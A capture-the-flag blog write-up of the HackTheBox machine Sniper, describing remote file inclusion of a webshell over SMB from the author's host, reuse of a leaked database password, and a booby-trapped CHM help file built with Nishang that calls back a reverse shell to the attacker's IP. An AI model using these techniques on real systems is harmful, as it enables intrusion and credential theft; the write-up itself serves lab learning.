---
layout: post
title: "Return to Sender"
subtitle: "HTB Sniper, where you make the server fetch your payload over SMB and then mail the admin a help file that detonates when opened"
date: 2020-04-04 12:00:00 +0000
description: "Sniper is two tricks of misplaced trust. A web page that fetches and runs any file you name, even one on your own server over SMB, and an admin who opens a help file you mailed them. Remote inclusion to a shell, a reused password, then a booby-trapped CHM for Administrator."
image: /assets/og/return-to-sender.png
tags: [hackthebox, windows, rfi, privesc, writeup]
---

Sniper is a delivery company, and the whole box is about delivery. You get the server to deliver your code, then you deliver the admin a package that goes off when they open it. There are two acts of misplaced trust here. A web page fetches and runs whatever file you point it at, and a human cannot resist opening a help file marked "instructions." Neither one is a memory-corruption magic trick. Both are someone trusting the address written on an envelope.

```
        S N I P E R   C O .
        ===================
        ?lang=   "give me a file, i'll read it aloud"
                 won't take it by hand (http blocked)
                 but mail it?  \\you\share\shell.php   sure.
                        |
                        v
        the clerk walks to YOUR mailbox, opens your letter,
        and does what it says.

        then you mail the boss a help file.
        he opens it to read it. it opens him.
                                            封
```

## 0x01 · the storefront

`nmap` comes back short and very Windows. IIS on 80, the SMB stack on 139 and 445, an RPC port up high.

```
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
```

The site is Sniper Co., a parcel-delivery company. The page worth staring at is the blog, which switches languages with a query parameter, `?lang=blog-en.php`. Any time a web app loads a file based on something you type, your ears should prick up. The page is not showing you that value. It is including it, and including a file means running it.

## 0x02 · a clerk who reads any letter

First prove the inclusion. Point `lang` at a file that exists on every Windows box.

```
http://10.10.10.151/blog/?lang=../../../../../windows/win.ini
```

`win.ini` comes back, so the page reads whatever path you hand it. The obvious next move is remote inclusion. Instead of a local file, you give it a file on your own server so the server runs your code. Plain HTTP gets blocked, because PHP has `allow_url_include` turned off. That looks like a dead end until you remember Windows has a second way to say "go fetch a file," and that way is SMB.

Picture the web app as a mail clerk who will fetch and read aloud any letter you name. He will not take a letter from your hand across the counter, which is the blocked HTTP path. Give him a mailing address on your own street instead, a Windows file share like `\\your-ip\share\file.php`, and he walks over, opens your mailbox, and reads your letter as if it were company mail. To Windows, a network share is just another file path.

Stand up a guest-readable SMB share with a one-line webshell sitting in it.

```
$ cat /share/iceberg.php
<?php  [ a one-line PHP webshell: run the 'cmd' request parameter ]  ?>

# aim the include at the share over SMB
http://10.10.10.151/blog/?lang=\\10.10.14.4\share\iceberg.php&cmd=whoami
nt authority\iusr
```

I am not printing the literal webshell, and that is the lesson, not laziness. It is four words long and it is the textbook PHP backdoor. The instant that exact string lands on a disk, any antivirus worth its license quarantines the file as malware, which is the funniest possible proof of how dangerous a one-line webshell really is. So picture it rather than paste it, and know that the real thing is shorter than this sentence.

The clerk walked to your mailbox and ran your command. Trade the webshell up for a real reverse shell and you land on the box as `iusr`, the low-privilege identity IIS runs as.

## 0x03 · the password that did two jobs

`iusr` cannot do much, so look where web apps always spill their secrets, in the source. The user portal keeps a database config.

```
C:\inetpub\wwwroot\user\db.php
   $dbuser = "dbuser";
   $dbpass = "36mEAhz/B8xQ~2VM";
```

On its own that only opens the database. But there is a local user named Chris on this box, and people reuse passwords like they reuse coffee mugs. The database password is also Chris's Windows password. Same PIN on the phone and the bank card.

You cannot cleanly `runas` from a webshell, but PowerShell has a tidy way to become someone once you know their password. Build a credential object and run a command as them.

```
$pass = ConvertTo-SecureString '36mEAhz/B8xQ~2VM' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('Sniper\Chris', $pass)
Invoke-Command -Computer localhost -Credential $cred -ScriptBlock { type C:\Users\Chris\Desktop\user.txt }
████████████████████████████████
```

Chris sits in the Remote Management Users group, so the command runs, and `user.txt` is yours.

## 0x04 · a letter that goes off when opened

Chris is not admin. The tell is sitting in Chris's Downloads, a half-finished pile of docs and a note about converting the company instructions into a CHM, the old Windows compiled-help format. Two facts collide. A CHM file can run commands the moment it opens, and something on this box keeps opening them. That something is a simulated admin doing their job, checking the docs folder.

So you forge one. Think of a CHM as a help file that can carry a live payload. Open it to read it and it detonates, like a letter rigged to go off when you slit the envelope. Nishang's `Out-CHM` builds a malicious help file that fires a command on open.

```
PS> Out-CHM -Payload "<nc64.exe reverse shell, calling back to 10.10.14.4:443>" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
PS> copy evil.chm C:\Docs\instructions.chm
```

Start a listener, and within a minute the admin reads the instructions. The envelope slits, the payload fires, and the shell comes back wearing the boss's coat.

```
$ nc -lnvp 443
Connection from 10.10.10.151
C:\> whoami
sniper\administrator
C:\> type C:\Users\Administrator\Desktop\root.txt
████████████████████████████████
```

## 0x05 · the honest caveat

Nothing on Sniper is exotic. It is two doors that were never locked, because each one looked like a feature. The include parameter was meant to load language files. It simply never checked that the file lived on the same planet, and Windows treating a network share as a local path turned "load a page" into "run the attacker's code." That is the part people miss about remote file inclusion. Blocking `http://` feels like a fix, but the platform has more than one way to fetch a file, and an attacker only needs one of them.

The CHM step is the scarier one, because there is no bug at all. A help file running its payload on open is documented behavior. The vulnerability is a human who opens an attachment, and you cannot patch a human. You can only stop handing attackers a place to drop files where humans look. Credential reuse is the quiet hinge between the two doors. A database password that should never have left the database walked straight into a Windows login, because one person used it twice.

## 0x06 · outro

```
the clerk fetched your letter because you wrote a real address on it.
the password opened two locks because someone was lazy with one.
the help file went off because a human opened it to be helpful.

three doors, none of them forced. each one was held open from the inside.

check what the server fetches. never reuse the key. never open the envelope. wear black.

                                                            EOF
```

---

*HTB: Sniper, retired 28 Mar 2020. A medium Windows box that is really a lesson in remote file inclusion over SMB, followed by the oldest privilege escalation on Earth. Mail the admin something they will open.*
